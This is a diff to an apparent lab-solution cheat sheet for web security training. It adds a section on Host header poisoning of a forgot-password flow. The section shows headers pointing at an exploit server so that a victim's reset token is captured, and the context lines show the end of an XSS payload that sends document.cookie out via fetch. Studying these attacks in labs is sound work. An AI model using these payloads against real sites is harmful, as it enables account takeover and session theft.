@@ -88,4 +88,22 @@ mode: 'no-cors',
 body:document.cookie
 });
 </script>
+```  
+
+## Host Header Poison - forgot-password
+
+### Authentication
+
+### Spoof IP Address
+>Identify that the alternate HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
+  
+<sub>Change the username parameter to carlos and send the request.</sub>
+```html
+X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net
+X-Host: EXPLOIT-SERVER-ID.exploit-server.net
+X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 ```
+<sup>Check the exploit server log to obtain the reset link to the victim username.</sup>
+  
+![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  
+
